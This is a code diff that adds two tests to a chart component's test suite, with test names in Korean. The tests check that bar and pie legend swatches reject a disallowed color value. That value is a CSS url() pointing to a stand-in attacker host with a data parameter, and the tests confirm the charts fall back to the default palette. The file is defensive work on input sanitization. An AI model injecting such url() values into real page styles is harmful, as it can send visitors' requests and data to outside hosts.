@@ -708,6 +708,32 @@ describe("chart — 시리즈와 색 (CLE-NODE-CHART · REQ-CHART-020)", () => {
       expect(strokes).toEqual(["red", "blue", "red"]);
     });
 
+    it("허용 밖의 색(url 등)은 칩 style 에 넣지 않고 기본 팔레트로 돌아간다", () => {
+      const chart = renderChart("bar", gap, ["url(https://attacker.example/p?d=1)", ""]);
+      expect(Array.from(new Set(fills(chart.querySelectorAll("rect"))))).toEqual([
+        "#5B4FE9",
+        "#22B8CF",
+      ]);
+      const styles = Array.from(chart.querySelectorAll(".wc-legend-swatch")).map(
+        (el) => el.getAttribute("style") ?? "",
+      );
+      expect(styles).toHaveLength(2);
+      expect(styles.join(";")).not.toMatch(/url\(/i);
+    });
+
+    it("pie 범례 칩도 허용 밖의 색을 쓰지 않는다", () => {
+      const chart = renderChart(
+        "pie",
+        [{ x: "a", y: 1 }, { x: "b", y: 2 }],
+        ["url(https://attacker.example/p?d=1)", "#111111"],
+      );
+      const styles = Array.from(chart.querySelectorAll(".wc-legend-swatch")).map(
+        (el) => el.getAttribute("style") ?? "",
+      );
+      expect(styles).toHaveLength(2);
+      expect(styles.join(";")).not.toMatch(/url\(/i);
+    });
+
     it("colors 가 없으면 기본 팔레트를 처음부터 쓴다", () => {
       const single = renderChart("bar", [{ x: "a", y: 1 }, { x: "b", y: 2 }]);
       expect(fills(single.querySelectorAll("rect"))).toEqual(["#5B4FE9", "#5B4FE9"]);
